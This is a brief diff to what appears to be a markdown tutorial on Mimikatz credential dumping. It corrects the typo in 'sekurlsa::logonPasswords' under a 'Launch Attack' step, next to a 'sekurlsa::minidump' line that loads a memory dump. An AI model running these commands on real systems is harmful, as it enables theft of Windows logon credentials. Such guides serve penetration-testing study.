@@ -27,7 +27,7 @@ sekurlsa::minidump /path/to/dump
 \
 8. Launch Attack
 ```bash
-sekurlsa::logonPasswors
+sekurlsa::logonPasswords
 ```
 ![logonpass](Media/LongOutput.png) 
 \
